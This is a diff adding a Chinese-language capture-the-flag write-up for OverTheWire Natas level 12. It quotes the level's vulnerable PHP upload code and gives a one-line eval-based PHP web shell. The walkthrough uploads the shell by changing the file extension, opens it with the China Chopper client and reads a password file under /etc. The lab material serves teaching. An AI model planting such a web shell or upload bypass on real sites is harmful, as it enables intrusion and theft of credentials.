@@ -659,3 +659,109 @@ title: OverTheWire：Natas
   ```
 - 编辑原 HTTP 请求头中的 *Cookie* 的值，并再次发送，成功获取下一关口令<br>
 ![EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3](img/natas23.jpg)
+
+## Level 12
+
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas12</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas12.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+- 表单：上传 JPEG 文件<br>
+![Choose a JPEG to upload (max 1KB)](img/natas24.jpg)
+- 查看源代码，注意到并没有对上传文件进行类型检查（包括文件后缀名），上传到服务器后，文件名是随机生成的字符串，文件后缀名则由前端直接定义
+  ```html
+  <html>
+  <head>
+  <!-- This stuff in the header has nothing to do with the level -->
+  </head>
+  <body>
+  <h1>natas12</h1>
+  <div id="content">
+  <?
+
+  # 生成长度为 10 的随机字符串
+  function genRandomString() {
+      $length = 10;
+      $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+      $string = "";
+
+      for ($p = 0; $p < $length; $p++) {
+          $string .= $characters[mt_rand(0, strlen($characters)-1)];
+      }
+
+      return $string;
+  }
+
+  function makeRandomPath($dir, $ext) {
+      do {
+      $path = $dir."/".genRandomString().".".$ext;
+      } while(file_exists($path));
+      return $path;
+  }
+
+  function makeRandomPathFromFilename($dir, $fn) {
+      # 获得传入路径字符串中的文件扩展名
+      $ext = pathinfo($fn, PATHINFO_EXTENSION);
+      return makeRandomPath($dir, $ext);
+  }
+
+  if(array_key_exists("filename", $_POST)) {
+      $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+      if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+          echo "File is too big";
+      }
+      else {
+          if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+              echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+          } else{
+              echo "There was an error uploading the file, please try again!";
+          }
+      }
+  }
+  else {
+  ?>
+
+  <form enctype="multipart/form-data" action="index.php" method="POST">
+  <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+  <!-- 直接定义文件后缀名。此处显示的文件名无效 -->
+  <input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
+  Choose a JPEG to upload (max 1KB):<br/>
+  <input name="uploadedfile" type="file" /><br />
+  <input type="submit" value="Upload File" />
+  </form>
+  <? } ?>
+  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+  </div>
+  </body>
+  </html>
+  ```
+- 创建并编辑文件`hack.php`
+  ```php
+  <?php @eval($_POST['pass']);?>
+  ```
+- 修改前端表单，将文件后缀`jpg`改为`php`，并上传文件`hack.php`<br>
+![修改 input 标签的值](img/natas25.jpg)
+- 保存文件链接<br>
+![http://natas12.natas.labs.overthewire.org/upload/6uf64xwhpq.php](img/natas26.jpg)
+- 先使用中国菜刀浏览器访问 http://natas12.natas.labs.overthewire.org，完成身份验证
+- 添加SHELL<br>
+![添加SHELL](img/natas27.jpg)
+- 进入文件系统后，找到`/etc/natas_webpass/natas13`即可<br>
+![jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY](img/natas28.jpg)
